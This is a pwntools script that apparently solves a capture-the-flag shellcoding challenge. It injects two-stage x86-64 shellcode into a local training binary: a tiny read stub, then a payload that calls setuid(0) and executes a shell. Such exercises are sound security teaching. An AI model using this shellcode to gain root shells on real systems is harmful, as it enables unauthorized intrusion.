from pwn import *

p = process('/challenge/babyshell-level-14', aslr=False)
context.update(arch="amd64")

# Stage 1: Call sys_read (choose read because don't need to set rax to 0 -> reduce size)
shellcode = asm('''
push rdx
pop rsi

push rax
pop rdi

syscall
''')

# Stage 2: Calling /bin/sh by sys_execve
shellcode2 = asm('''nop\n'''*6+'''
push 0
pop rdi
push 0x69
pop rax
syscall

push 0x68
push 0x6e69622f
mov DWORD PTR [rsp+4], 0x7361622f
push rsp
pop rdi

push 0
pop rsi

push 0
pop rdx

push 0x3b
pop rax
syscall
''')
print(f"Shellcode length: {len(shellcode)} bytes")

p.send(shellcode)
p.send(shellcode2)
p.interactive()
